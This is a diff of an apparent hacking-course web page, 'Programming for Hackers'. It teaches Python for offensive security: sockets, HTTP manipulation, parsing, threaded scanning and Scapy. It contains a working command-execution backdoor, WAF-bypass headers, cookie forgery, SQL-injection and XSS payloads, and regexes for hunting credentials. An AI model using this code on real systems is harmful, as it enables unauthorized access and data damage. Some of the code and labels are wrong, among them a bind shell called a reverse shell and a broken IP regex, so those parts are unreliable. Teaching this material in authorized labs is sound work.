@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chapter 04: Web Security Fundamentals - NullSector</title>
+    <title>Chapter 06: Programming for Hackers - NullSector</title>
     <link rel="icon" type="image/svg+xml" href="favicon.svg">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -105,115 +105,3283 @@
     <aside class="sidebar">
         <div class="sidebar-section">
             <div class="sidebar-title">On This Page</div>
-            <a href="#how-web-works" class="sidebar-link">How the Web Works</a>
-            <a href="#http" class="sidebar-link">HTTP Protocol Deep Dive</a>
-            <a href="#browsers" class="sidebar-link">Browser Security Model</a>
-            <a href="#owasp" class="sidebar-link">OWASP Top 10</a>
-            <a href="#xss" class="sidebar-link">XSS Attacks</a>
-            <a href="#sqli" class="sidebar-link">SQL Injection</a>
-            <a href="#csrf" class="sidebar-link">CSRF Attacks</a>
-            <a href="#tools" class="sidebar-link">Web Hacking Tools</a>
+            <a href="#philosophy" class="sidebar-link">The Hacker's Programming Philosophy</a>
+            <a href="#python-security" class="sidebar-link">Python for Security</a>
+            <a href="#network-programming" class="sidebar-link">Network Programming</a>
+            <a href="#c-fundamentals" class="sidebar-link">C Programming Fundamentals</a>
+            <a href="#c-exploitation" class="sidebar-link">C for Exploitation</a>
+            <a href="#assembly-intro" class="sidebar-link">Introduction to Assembly</a>
+            <a href="#reading-assembly" class="sidebar-link">Reading Assembly Code</a>
+            <a href="#gdb-debugging" class="sidebar-link">GDB & Debugging</a>
+            <a href="#shellcode" class="sidebar-link">Shellcode Basics</a>
+            <a href="#exploit-dev" class="sidebar-link">Exploit Development</a>
+            <a href="#building-tools" class="sidebar-link">Building Security Tools</a>
+            <a href="#projects" class="sidebar-link">Real-World Projects</a>
         </div>
         <div class="sidebar-section">
             <div class="sidebar-title">Navigation</div>
-            <a href="hacking-ch05.html" class="sidebar-link">Next: Chapter 05 →</a>
-            <a href="hacking-ch03.html" class="sidebar-link">← Previous: Chapter 03</a>
+            <a href="hacking-ch07.html" class="sidebar-link">Next: Chapter 07 →</a>
+            <a href="hacking-ch05.html" class="sidebar-link">← Previous: Chapter 05</a>
             <a href="roadmap-hacking.html" class="sidebar-link">Back to Roadmap</a>
         </div>
     </aside>
 
     <main class="main">
         <div class="page-header">
-            <div class="chapter-label">Chapter 04</div>
-            <h1 class="page-title">Web Security Fundamentals</h1>
-            <p class="page-subtitle">The internet is built on trust - and breaking that trust is what web hacking is all about. Learn how websites work, where they fail, and how attackers exploit those failures.</p>
+            <div class="chapter-label">Chapter 06</div>
+            <h1 class="page-title">Programming for Hackers</h1>
+            <p class="page-subtitle">True power comes from understanding systems at their deepest level. Master Python, C, and Assembly - the languages that let you bend machines to your will and exploit them when they resist.</p>
         </div>
 
-        <section class="section">
-            <p>Web applications are the most common target for hackers today. Why? Because EVERYTHING is on the web - banking, healthcare, government, shopping, social media. Over 80% of all cyberattacks target web applications. If you can hack the web, you can hack the world.</p>
-            <p>This chapter will teach you how web applications work at a fundamental level, then show you exactly where and how they break. By the end, you'll understand the architecture that powers the modern internet and see it through a hacker's eyes - every feature as a potential vulnerability, every input as an attack vector.</p>
-            <div class="info-box">
-                <h4>Career Reality Check</h4>
-                <p>Over 70% of penetration testing jobs focus on web applications. Companies like Google, Facebook, Microsoft, and countless others pay bug bounties ranging from $500 to $100,000+ for web vulnerabilities. Master web security and you'll never be without work - or income.</p>
+
+        <section class="section" id="philosophy">
+            <h2 class="section-title">The Hacker's Programming Philosophy</h2>
+            <p class="section-intro">Most programmers write code to build things. Hackers write code to break things, understand things, and rebuild them better. This fundamental difference in perspective changes everything about how you approach programming.</p>
+
+            <p>When a developer sees a function, they see what it does. When a hacker sees a function, they see what it <em>could</em> do - every edge case, every unexpected input, every way it might fail. This chapter will transform you from someone who uses programming languages into someone who <strong>weaponizes</strong> them.</p>
+
+            <div class="metaphor-box">
+                <h4>The Locksmith vs The Lockpick</h4>
+                <p>Regular programmers are locksmiths - they build locks that work as intended. Hackers are lockpicks - they understand locks so deeply that they can open any lock, even ones they've never seen before. Both need deep knowledge of mechanisms, but lockpicks need to understand failure modes, tolerances, and exploitation vectors that locksmiths never consider.</p>
+                <p>This chapter teaches you to be both - to build robust systems AND exploit weak ones.</p>
             </div>
-            
-            <div class="card-grid" style="margin-top: 2rem;">
+
+            <h3>Why Hackers Need Multiple Languages</h3>
+            <p>You can't be a elite hacker with just one language. Different attack surfaces require different tools:</p>
+
+            <div class="card-grid">
                 <div class="card">
-                    <h4>🎯 Why Web Hacking?</h4>
-                    <ul style="margin-top: 1rem; font-size: 0.9rem;">
-                        <li>Every company has a web presence</li>
-                        <li>High reward bug bounties</li>
-                        <li>No physical access needed</li>
-                        <li>Attack from anywhere in the world</li>
-                        <li>Huge attack surface</li>
-                    </ul>
+                    <h4>🐍 Python - The Swiss Army Knife</h4>
+                    <p><strong>Use Case:</strong> Rapid exploit development, network automation, web scraping, API fuzzing, quick scripts.</p>
+                    <p><strong>Why Essential:</strong> 90% of security tools are written in Python. Most CTF challenges can be solved with Python. It's the lingua franca of hacking.</p>
+                    <p><strong>Hacker Mindset:</strong> "If I can script it in 5 minutes, I can automate attacking 10,000 targets tonight."</p>
                 </div>
                 <div class="card">
-                    <h4>📊 Web Vulnerability Stats</h4>
-                    <ul style="margin-top: 1rem; font-size: 0.9rem;">
-                        <li>Injection: #3 OWASP Top 10</li>
-                        <li>Broken Access Control: #1</li>
-                        <li>XSS: Still incredibly common</li>
-                        <li>Average website: 15+ vulnerabilities</li>
-                        <li>Bug bounty avg payout: $3,000+</li>
-                    </ul>
+                    <h4>⚙️ C - The Systems Language</h4>
+                    <p><strong>Use Case:</strong> Binary exploitation, understanding memory corruption, writing shellcode, kernel hacking, reverse engineering.</p>
+                    <p><strong>Why Essential:</strong> Most vulnerabilities exist at the C level - buffer overflows, format strings, use-after-free. You can't exploit what you don't understand.</p>
+                    <p><strong>Hacker Mindset:</strong> "Show me the assembly and I'll show you the exploit."</p>
+                </div>
+                <div class="card">
+                    <h4>🔧 Assembly - The Hardware Language</h4>
+                    <p><strong>Use Case:</strong> Reverse engineering malware, analyzing exploits, writing compact shellcode, understanding CPU-level security.</p>
+                    <p><strong>Why Essential:</strong> When you read disassembled binaries, you're reading assembly. When you craft exploits, you're thinking in assembly. This is the language computers actually speak.</p>
+                    <p><strong>Hacker Mindset:</strong> "Every instruction is an opportunity. Every register is a weapon."</p>
+                </div>
+            </div>
+
+            <div class="info-box">
+                <h4>The 80/20 Reality</h4>
+                <p><strong>80% of your hacking will be in Python</strong> - scripts, tools, automation, networking. It's fast to write, easy to debug, and perfect for proof-of-concepts.</p>
+                <p><strong>15% will be in C</strong> - understanding vulnerabilities, reading source code, modifying exploits, writing low-level tools.</p>
+                <p><strong>5% will be in Assembly</strong> - reverse engineering, shellcode development, analyzing malware, understanding processor-level exploitation.</p>
+                <p>But that 5% is where legendary hackers are made. Anyone can run Metasploit. Only true hackers understand what Metasploit is actually doing under the hood.</p>
+            </div>
+
+            <h3>The Hacker Development Workflow</h3>
+            <p>Professional developers follow Agile, do code reviews, write tests. Hackers have a different workflow:</p>
+
+            <ol>
+                <li><strong>Reconnaissance</strong> - Understand the target system completely before writing a single line of code</li>
+                <li><strong>Rapid Prototyping</strong> - Build quick proof-of-concept exploits to test theories</li>
+                <li><strong>Iterative Refinement</strong> - Exploit failed? Understand why, adjust, try again</li>
+                <li><strong>Weaponization</strong> - Once it works, make it reliable, portable, and undetectable</li>
+                <li><strong>Documentation</strong> - Write detailed exploit notes for future reference and bug bounties</li>
+            </ol>
+
+            <div class="warning-box">
+                <h4>⚠️ The Ethics Line</h4>
+                <p>Everything in this chapter can be used for good or evil. Penetration testers use these skills to protect systems. Black hats use them to steal data and extort companies. Bug bounty hunters use them to earn six-figure incomes legally.</p>
+                <p><strong>The difference is permission.</strong> Never test your skills on systems you don't own or don't have written authorization to test. One unauthorized scan can land you in federal prison. Countries have extradition treaties for cybercrime.</p>
+                <p>Build your lab, use HackTheBox, play CTFs, do bug bounties. There are infinite legal targets. You don't need to break the law to become elite.</p>
+            </div>
+
+            <h3>Thinking Like a Hacker: The Attack Surface Mindset</h3>
+            <p>When you look at code as a hacker, you see it differently than other programmers. Let's examine this simple Python function through both lenses:</p>
+
+            <div class="code">def process_user_input(username):
+    return f"Hello, {username}!"</div>
+
+            <p><strong>Developer sees:</strong> A friendly greeting function that returns a personalized message.</p>
+            <p><strong>Hacker sees:</strong></p>
+            <ul>
+                <li>No input validation - what if username contains special characters?</li>
+                <li>String interpolation with user data - potential for injection attacks</li>
+                <li>No length limit - could this cause a buffer overflow downstream?</li>
+                <li>No encoding - what about Unicode attacks or null bytes?</li>
+                <li>Return value used directly - where does this output go? HTML? Database? Command line?</li>
+            </ul>
+
+            <p>Every input is untrusted. Every output is a potential attack vector. Every assumption is a vulnerability waiting to happen. This paranoid mindset is what separates script kiddies from professionals.</p>
+
+            <div class="metaphor-box">
+                <h4>The Adversarial Mindset</h4>
+                <p>Imagine you're designing a vault. A normal engineer thinks: "How do I make this secure?" A hacker thinks: "If I were trying to rob this vault, how would I do it?" Then they design the vault to prevent those attacks.</p>
+                <p>The best security professionals think like attackers first, defenders second. You can't protect what you don't understand, and you can't understand attacks without thinking like an attacker.</p>
+            </div>
+
+            <h3>Building Your Hacker Development Environment</h3>
+            <p>Before we dive into languages, let's set up your workspace. Hackers don't develop in Windows with Visual Studio. Here's your toolkit:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Tool</th>
+                        <th>Purpose</th>
+                        <th>Why Hackers Use It</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Kali Linux</strong></td>
+                        <td>Operating System</td>
+                        <td>Pre-loaded with 600+ hacking tools, optimized for security testing</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Visual Studio Code</strong></td>
+                        <td>Code Editor</td>
+                        <td>Lightweight, extensible, works across languages, great debugging</td>
+                    </tr>
+                    <tr>
+                        <td><strong>GDB + Pwndbg</strong></td>
+                        <td>Debugger</td>
+                        <td>Step through assembly, analyze memory, develop exploits</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Python 3.x</strong></td>
+                        <td>Scripting Language</td>
+                        <td>Built into Kali, perfect for rapid exploit development</td>
+                    </tr>
+                    <tr>
+                        <td><strong>GCC</strong></td>
+                        <td>C Compiler</td>
+                        <td>Compile exploits, understand vulnerabilities, build tools</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Tmux</strong></td>
+                        <td>Terminal Multiplexer</td>
+                        <td>Multiple terminal panes, persistent sessions, efficient workflow</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <p>Set this up now if you haven't already. Everything in this chapter assumes you're working in a Linux environment. If you're on Windows, use WSL2 or run Kali in a VM. Mac users have it easier - most tools work natively on Unix systems.</p>
+
+            <div class="info-box">
+                <h4>The Hacker's Daily Driver</h4>
+                <p>Real penetration testers typically use:</p>
+                <ul>
+                    <li><strong>Primary OS:</strong> Kali Linux or ParrotOS (for offensive work)</li>
+                    <li><strong>Terminal:</strong> Tmux with multiple panes (code, target, notes)</li>
+                    <li><strong>Editor:</strong> Vim/Neovim (for speed) or VSCode (for convenience)</li>
+                    <li><strong>Notes:</strong> Obsidian or CherryTree for documenting findings</li>
+                    <li><strong>Burp Suite:</strong> Always running, intercepting traffic</li>
+                </ul>
+                <p>The faster you can iterate (test → analyze → modify → test), the more vulnerabilities you'll find. Efficient tooling makes you a 10x hacker.</p>
+            </div>
+        </section>
+
+        <section class="section" id="python-security">
+            <h2 class="section-title">Python for Security - Beyond Scripts</h2>
+            <p class="section-intro">You already know Python basics. Now learn to wield it as a weapon. This section covers socket programming, HTTP manipulation, parsing, and automation - the building blocks of every security tool you'll ever use.</p>
+
+            <h3>Why Python Dominates Cybersecurity</h3>
+            <p>Walk into any security conference, any CTF, any bug bounty hunter's laptop, and you'll see Python everywhere. There's a reason:</p>
+
+            <ul>
+                <li><strong>Rapid Development:</strong> Write exploits in minutes, not hours</li>
+                <li><strong>Rich Libraries:</strong> Requests, Scapy, Paramiko, Pwntools - everything you need already exists</li>
+                <li><strong>Cross-Platform:</strong> Write once, run on Linux, Windows, Mac</li>
+                <li><strong>Easy to Modify:</strong> Other people's exploits are trivial to adapt</li>
+                <li><strong>Interactive Shell:</strong> Test attack payloads instantly in the Python REPL</li>
+            </ul>
+
+            <div class="metaphor-box">
+                <h4>Python is Your Duct Tape</h4>
+                <p>In the physical world, duct tape fixes everything quickly. It's not elegant, but it works. Python is the hacker's duct tape - need to parse weird data? Python. Need to send 10,000 requests? Python. Need to automate repetitive tasks? Python.</p>
+                <p>Meanwhile, C is your welding torch - slower to use, requires more skill, but creates permanent, robust solutions. Assembly is your microscope - tedious, but shows you details impossible to see otherwise.</p>
+                <p>Master all three, but reach for Python first.</p>
+            </div>
+
+            <h3>Network Programming: Sockets and Protocols</h3>
+            <p>At its core, hacking is about talking to systems in ways they don't expect. HTTP is just formatted text over TCP. SSH is encrypted text over TCP. Everything is sockets underneath.</p>
+
+            <h4>Raw Socket Programming - TCP Client</h4>
+            <p>Forget <span class="inline-code">requests</span> library for a moment. Let's build HTTP from scratch:</p>
+
+            <div class="code">import socket
+
+# Create a TCP socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Connect to target
+target = ("example.com", 80)
+sock.connect(target)
+
+# Send raw HTTP request
+request = b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
+sock.send(request)
+
+# Receive response
+response = sock.recv(4096)
+print(response.decode())
+
+sock.close()</div>
+
+            <p><strong>What's happening here?</strong></p>
+            <ul>
+                <li><span class="inline-code">socket.AF_INET</span> = IPv4 addressing</li>
+                <li><span class="inline-code">socket.SOCK_STREAM</span> = TCP protocol (reliable, ordered)</li>
+                <li><span class="inline-code">connect()</span> = Three-way handshake with target</li>
+                <li><span class="inline-code">send()</span> = Push bytes onto the network</li>
+                <li><span class="inline-code">recv()</span> = Pull bytes from the network</li>
+            </ul>
+
+            <div class="info-box">
+                <h4>Why This Matters for Hacking</h4>
+                <p>When you use <span class="inline-code">requests.get()</span>, it does all of this for you - but it also makes assumptions. What if the target doesn't follow HTTP standards? What if you need to craft a malformed request to trigger a bug? What if you need to send data faster than the library allows?</p>
+                <p>Raw sockets give you <strong>complete control</strong>. You can craft any packet, violate any protocol, send any data. This is essential for:</p>
+                <ul>
+                    <li>Exploiting protocol vulnerabilities</li>
+                    <li>Bypassing WAFs that expect standard requests</li>
+                    <li>Writing custom C2 (Command & Control) protocols</li>
+                    <li>Implementing uncommon protocols the target uses</li>
+                </ul>
+            </div>
+
+            <h4>Building a TCP Server - Your First Backdoor</h4>
+            <p>Servers listen for connections. Backdoors are servers that execute commands. Let's build one:</p>
+
+            <div class="code">import socket
+import subprocess
+
+def run_command(cmd):
+    """Execute shell command and return output"""
+    try:
+        output = subprocess.check_output(cmd, shell=True, 
+                                        stderr=subprocess.STDOUT)
+        return output
+    except subprocess.CalledProcessError as e:
+        return e.output
+
+# Create server socket
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+# Bind to interface
+server.bind(("0.0.0.0", 4444))
+server.listen(5)
+
+print("[*] Listening on port 4444...")
+
+while True:
+    client, addr = server.accept()
+    print(f"[+] Connection from {addr[0]}:{addr[1]}")
+    
+    while True:
+        # Receive command
+        cmd = client.recv(1024).decode().strip()
+        
+        if cmd.lower() == "exit":
+            break
+            
+        if not cmd:
+            continue
+        
+        # Execute and send result
+        result = run_command(cmd)
+        client.send(result + b"\n")
+    
+    client.close()
+    print(f"[-] Connection from {addr[0]} closed")</div>
+
+            <p><strong>This is a fully functional reverse shell.</strong> Run this on a compromised machine, connect with <span class="inline-code">nc &lt;ip&gt; 4444</span>, and you have remote command execution. This 40-line Python script is the basis of thousands of real-world backdoors.</p>
+
+            <div class="warning-box">
+                <h4>⚠️ Legal Notice: Do NOT Deploy This Unauthorized</h4>
+                <p>This code is for educational purposes and authorized testing ONLY. Deploying backdoors on systems you don't own is a federal crime under CFAA (Computer Fraud and Abuse Act). Penalties include:</p>
+                <ul>
+                    <li>Up to 20 years in prison for malicious access</li>
+                    <li>Fines up to $500,000</li>
+                    <li>Permanent criminal record</li>
+                    <li>Civil lawsuits for damages</li>
+                </ul>
+                <p>Use this in your own lab, on CTF platforms, or with written authorization. Never on production systems, never without permission, never "just to see if it works."</p>
+            </div>
+
+            <h4>Advanced Socket Concepts for Exploitation</h4>
+            <p>Beyond basic connect/send/recv, hackers need to understand:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Technique</th>
+                        <th>Use Case</th>
+                        <th>Python Implementation</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Non-blocking Sockets</strong></td>
+                        <td>Handle multiple connections simultaneously without threading</td>
+                        <td><span class="inline-code">sock.setblocking(False)</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Socket Timeout</strong></td>
+                        <td>Detect dead connections, avoid hanging forever</td>
+                        <td><span class="inline-code">sock.settimeout(5.0)</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>UDP Sockets</strong></td>
+                        <td>Faster than TCP, good for scanners and DoS</td>
+                        <td><span class="inline-code">socket.SOCK_DGRAM</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Raw Sockets</strong></td>
+                        <td>Craft custom IP packets, requires root/admin</td>
+                        <td><span class="inline-code">socket.SOCK_RAW</span></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>HTTP Manipulation: Requests on Steroids</h3>
+            <p>The <span class="inline-code">requests</span> library is perfect for normal HTTP. But hackers need abnormal HTTP. Let's explore advanced techniques:</p>
+
+            <h4>Custom Headers for WAF Bypass</h4>
+            <div class="code">import requests
+
+# Standard request - might get blocked
+response = requests.get("https://target.com/admin")
+
+# Custom headers to bypass detection
+headers = {
+    "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)",
+    "X-Forwarded-For": "127.0.0.1",  # Pretend we're localhost
+    "X-Originating-IP": "127.0.0.1",
+    "X-Remote-IP": "127.0.0.1",
+    "X-Remote-Addr": "127.0.0.1"
+}
+
+response = requests.get("https://target.com/admin", headers=headers)</div>
+
+            <p>Many web application firewalls (WAFs) trust certain headers. <span class="inline-code">X-Forwarded-For</span> tricks the backend into thinking you're connecting from a trusted IP. <span class="inline-code">User-Agent: Googlebot</span> makes you look like a search engine crawler.</p>
+
+            <h4>Session Persistence and Cookie Manipulation</h4>
+            <div class="code">import requests
+
+# Create a session - maintains cookies across requests
+session = requests.Session()
+
+# Login
+login_data = {
+    "username": "admin",
+    "password": "password123"
+}
+session.post("https://target.com/login", data=login_data)
+
+# Session now has authentication cookie
+# All subsequent requests use this cookie automatically
+response = session.get("https://target.com/dashboard")
+
+# Manually inject a cookie
+session.cookies.set("admin", "true", domain="target.com")
+session.cookies.set("role", "administrator", domain="target.com")
+
+# Now you're "authenticated" with forged cookies
+response = session.get("https://target.com/admin-panel")</div>
+
+            <p>Cookie manipulation is <strong>critical</strong> for:</p>
+            <ul>
+                <li>Testing authorization flaws</li>
+                <li>Session hijacking exploitation</li>
+                <li>Privilege escalation attacks</li>
+                <li>Bypassing client-side restrictions</li>
+            </ul>
+
+            <h4>Handling Proxies for Burp Suite Integration</h4>
+            <div class="code">import requests
+
+# Route traffic through Burp for analysis
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080"
+}
+
+# Disable SSL verification (Burp uses self-signed cert)
+response = requests.get("https://target.com", 
+                       proxies=proxies, 
+                       verify=False)</div>
+
+            <p>This lets you:</p>
+            <ul>
+                <li>Intercept and modify requests in Burp Suite</li>
+                <li>Analyze complex authentication flows</li>
+                <li>Test payloads interactively</li>
+                <li>Combine scripting power with Burp's tools</li>
+            </ul>
+
+            <h3>Parsing and Data Extraction</h3>
+            <p>Hacking generates massive amounts of data - scan results, log files, API responses, HTML pages. You need to extract intelligence from chaos quickly.</p>
+
+            <h4>BeautifulSoup - HTML Parsing for Reconnaissance</h4>
+            <div class="code">import requests
+from bs4 import BeautifulSoup
+
+# Fetch target page
+response = requests.get("https://target.com")
+soup = BeautifulSoup(response.text, 'html.parser')
+
+# Extract all links
+links = [a.get('href') for a in soup.find_all('a')]
+
+# Find forms (potential injection points)
+forms = soup.find_all('form')
+for form in forms:
+    action = form.get('action')
+    method = form.get('method')
+    inputs = [inp.get('name') for inp in form.find_all('input')]
+    print(f"Form: {action} ({method}) - Inputs: {inputs}")
+
+# Find comments (developers leave secrets here)
+comments = soup.find_all(string=lambda text: isinstance(text, Comment))
+for comment in comments:
+    print(f"Comment found: {comment}")</div>
+
+            <p>This script automatically maps attack surface:</p>
+            <ul>
+                <li>All URLs reachable from homepage</li>
+                <li>All forms that accept input (XSS/SQLi targets)</li>
+                <li>All HTML comments (might contain credentials, TODOs, internal URLs)</li>
+            </ul>
+
+            <h4>Regular Expressions for Pattern Matching</h4>
+            <div class="code">import re
+
+# Find potential SQL injection points in URLs
+text = """
+Visit: https://target.com/user?id=123
+Profile: https://target.com/profile.php?user=admin
+Search: https://target.com/search?q=test&category=all
+"""
+
+# Pattern: URLs with query parameters
+sqli_candidates = re.findall(r'https?://[^\s]+\?[^\s]+', text)
+
+# Find email addresses in response
+emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', text)
+
+# Find AWS keys (common developer mistake)
+aws_keys = re.findall(r'AKIA[0-9A-Z]{16}', text)
+
+# Find private IPv4 addresses
+internal_ips = re.findall(r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}', text)</div>
+
+            <p>Regex is your intelligence filter. You dump gigabytes of data from a scan, regex extracts the 10 lines that matter. Master these patterns:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Pattern</th>
+                        <th>What It Finds</th>
+                        <th>Why It Matters</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">r'password\s*=\s*["\']([^"\']+)'</span></td>
+                        <td>Hardcoded passwords</td>
+                        <td>Instant access to systems</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">r'\b\d{1,3}\.{3}\d{1,3}\b'</span></td>
+                        <td>IP addresses</td>
+                        <td>Internal network discovery</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">r'(api[_-]?key|token)\s*[:=]\s*([a-zA-Z0-9]+)'</span></td>
+                        <td>API keys and tokens</td>
+                        <td>Access to third-party services</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">r'/admin|/dashboard|/config'</span></td>
+                        <td>Sensitive endpoints</td>
+                        <td>High-value targets</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Automation: From Script to Weapon</h3>
+            <p>A script you run manually is a tool. A script that runs itself is a weapon. Let's build automation that scales.</p>
+
+            <h4>Multi-threaded Scanner</h4>
+            <div class="code">import requests
+import threading
+from queue import Queue
+
+class Scanner:
+    def __init__(self, targets, threads=10):
+        self.targets = Queue()
+        for target in targets:
+            self.targets.put(target)
+        
+        self.threads = threads
+        self.results = []
+        self.lock = threading.Lock()
+    
+    def scan_target(self):
+        while not self.targets.empty():
+            url = self.targets.get()
+            try:
+                response = requests.get(url, timeout=5)
+                with self.lock:
+                    self.results.append({
+                        'url': url,
+                        'status': response.status_code,
+                        'length': len(response.content)
+                    })
+                    print(f"[+] {url} - {response.status_code}")
+            except requests.RequestException as e:
+                print(f"[-] {url} - Failed: {e}")
+            finally:
+                self.targets.task_done()
+    
+    def run(self):
+        threads = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=self.scan_target)
+            t.daemon = True
+            t.start()
+            threads.append(t)
+        
+        self.targets.join()
+        return self.results
+
+# Usage
+targets = [f"https://target.com/page{i}" for i in range(100)]
+scanner = Scanner(targets, threads=20)
+results = scanner.run()
+
+# Analyze results
+vulnerable = [r for r in results if r['status'] == 200]
+print(f"\n[*] Found {len(vulnerable)} accessible pages")</div>
+
+            <p>This scanner hits 100 URLs with 20 concurrent threads. On a gigabit connection, you can scan thousands of URLs per minute. Scale this to millions of targets and you're doing internet-wide reconnaissance.</p>
+
+            <div class="metaphor-box">
+                <h4>The Automation Multiplier</h4>
+                <p>A human can test one target per hour manually. That's 8 targets per workday, 40 per week. A script can test 1,000 targets per hour. That's 24,000 per day, 120,000 per week.</p>
+                <p>Bug bounty hunters who make six figures automate <em>everything</em>. They write scripts that test every endpoint, every parameter, every possible injection point across hundreds of targets simultaneously. While you're manually testing one site, they've already found and reported 50 vulnerabilities.</p>
+                <p>Don't compete on manual skill. Compete on automation efficiency.</p>
+            </div>
+
+            <h4>Building Reusable Exploit Modules</h4>
+            <p>Don't write the same code twice. Build libraries:</p>
+
+            <div class="code"># exploit_toolkit.py
+import requests
+
+class ExploitBase:
+    def __init__(self, target):
+        self.target = target
+        self.session = requests.Session()
+    
+    def test_sqli(self, param):
+        """Test SQL injection on parameter"""
+        payloads = ["'", "' OR '1'='1", "'; DROP TABLE users--"]
+        for payload in payloads:
+            response = self.session.get(f"{self.target}?{param}={payload}")
+            if "error" in response.text.lower():
+                return True, payload
+        return False, None
+    
+    def test_xss(self, param):
+        """Test XSS on parameter"""
+        payload = "<script>alert(1)</script>"
+        response = self.session.get(f"{self.target}?{param}={payload}")
+        if payload in response.text:
+            return True
+        return False
+    
+    def brute_directories(self, wordlist):
+        """Brute force directory discovery"""
+        found = []
+        with open(wordlist) as f:
+            for line in f:
+                path = line.strip()
+                url = f"{self.target}/{path}"
+                response = self.session.get(url)
+                if response.status_code == 200:
+                    found.append(url)
+        return found
+
+# Use it
+exploit = ExploitBase("https://target.com")
+sqli_vulnerable, payload = exploit.test_sqli("id")
+if sqli_vulnerable:
+    print(f"[!] SQL Injection found with payload: {payload}")</div>
+
+            <p>Now you have a reusable framework. Every new target, you import your toolkit and run automated tests. Over time, your toolkit grows with every vulnerability you discover, every bypass you develop, every technique you learn.</p>
+
+            <div class="info-box">
+                <h4>The Professional Hacker's Toolkit</h4>
+                <p>After a few years, professional pentesters have thousands of lines of custom Python code:</p>
+                <ul>
+                    <li><strong>Recon modules:</strong> Subdomain enumeration, port scanning, tech detection</li>
+                    <li><strong>Exploit modules:</strong> SQLi, XSS, CSRF, XXE, SSRF, RCE testers</li>
+                    <li><strong>Parser modules:</strong> Extract data from Nmap, Burp, ZAP, Nessus</li>
+                    <li><strong>Reporting modules:</strong> Auto-generate pentest reports from findings</li>
+                    <li><strong>Utility modules:</strong> Encoding/decoding, payload generation, obfuscation</li>
+                </ul>
+                <p>Build your arsenal incrementally. Every CTF, every bug bounty, every engagement - add to your toolkit. In 2 years, you'll have a competitive advantage worth $100k+ in saved time.</p>
+            </div>
+        </section>
+
+        <section class="section" id="network-programming">
+            <h2 class="section-title">Network Programming: Packets, Protocols, and Power</h2>
+            <p class="section-intro">HTTP is cute. TCP is comfortable. But real network hackers go deeper - crafting raw packets, implementing custom protocols, bending networking rules. This is where you transcend libraries and touch the network directly.</p>
+
+            <h3>Understanding the Network Stack</h3>
+            <p>Every packet you send traverses multiple layers. Understanding this is critical for exploitation:</p>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h4>Layer 7 - Application</h4>
+                    <p><strong>Protocols:</strong> HTTP, FTP, SSH, DNS</p>
+                    <p><strong>Hacker View:</strong> Where most vulnerabilities live. Parse errors, logic flaws, injection points.</p>
+                    <p><strong>Attack Surface:</strong> Massive - every web app, every API, every service.</p>
+                </div>
+                <div class="card">
+                    <h4>Layer 4 - Transport</h4>
+                    <p><strong>Protocols:</strong> TCP, UDP</p>
+                    <p><strong>Hacker View:</strong> Connection manipulation, port scanning, covert channels.</p>
+                    <p><strong>Attack Surface:</strong> Firewall bypass, service fingerprinting, DoS attacks.</p>
+                </div>
+                <div class="card">
+                    <h4>Layer 3 - Network</h4>
+                    <p><strong>Protocols:</strong> IP, ICMP</p>
+                    <p><strong>Hacker View:</strong> Routing attacks, IP spoofing, tunneling.</p>
+                    <p><strong>Attack Surface:</strong> MitM attacks, routing table poisoning, reconnaissance.</p>
+                </div>
+                <div class="card">
+                    <h4>Layer 2 - Data Link</h4>
+                    <p><strong>Protocols:</strong> Ethernet, ARP, Wi-Fi</p>
+                    <p><strong>Hacker View:</strong> Local network attacks, MAC spoofing, ARP poisoning.</p>
+                    <p><strong>Attack Surface:</strong> Local network only, but devastating impact.</p>
+                </div>
+            </div>
+
+            <p>Most hackers work at Layer 7. Good hackers understand Layer 4. Elite hackers exploit all layers simultaneously. Let's go deeper.</p>
+
+            <h3>Scapy: The Network Swiss Army Knife</h3>
+            <p>Scapy is Python's most powerful networking library. It lets you build, manipulate, and send packets at any layer. This is essential for:</p>
+            <ul>
+                <li>Custom port scanning with SYN/ACK/FIN packets</li>
+                <li>ARP spoofing and MitM attacks</li>
+                <li>DNS query crafting and cache poisoning</li>
+                <li>Custom protocol implementation</li>
+                <li>Network fuzzing and protocol testing</li>
+            </ul>
+
+            <h4>Building Packets from Scratch</h4>
+            <div class="code">from scapy.all import *
+
+# Layer 3 (IP) + Layer 4 (TCP)
+packet = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")
+
+# Send and receive response
+response = sr1(packet, timeout=2)
+
+if response:
+    print(f"[+] Port 80 is open")
+    print(response.show())
+else:
+    print(f"[-] No response (port closed or filtered)")</div>
+
